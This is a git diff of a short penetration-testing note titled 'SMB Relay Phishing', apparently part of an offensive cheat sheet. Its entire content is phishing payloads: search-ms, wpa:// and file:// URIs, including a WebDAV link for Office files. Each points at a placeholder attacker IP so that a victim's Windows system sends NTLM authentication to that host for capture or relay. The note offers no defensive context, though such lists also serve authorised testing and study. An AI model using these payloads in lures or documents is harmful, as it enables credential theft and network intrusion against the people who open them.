@@ -1,10 +1,10 @@
-# 03 - Phishing
+# SMB Relay Phishing
 
 Search Tag(s): #mitm #responder #smb #relay #ntlm #scenarios #phishing
 
 TODO: Fill this info
 
-## 3.1 - MSQuery
+## 01 - MSQuery
 
 ```
 search-ms://query=<anything>&subquery=\\<attacker_IP>\<anything>.search-ms
@@ -12,8 +12,16 @@ search-ms://query=<anything>&subquery=\\<attacker_IP>\<anything>.search-ms
 search-ms://query=<anything>&crumb=location:\\<attacker_IP>\<anything>
 ```
 
-## 3.2 - Windows Performance Analyzer
+## 02 - Windows Performance Analyzer
 
 ```
 wpa:////<attacker_IP>/<anything>
+```
+
+## 03 - LibreOffice and Microsoft Office
+
+WebDAV link.
+
+```
+file://<attacker_IP>/snare
 ```
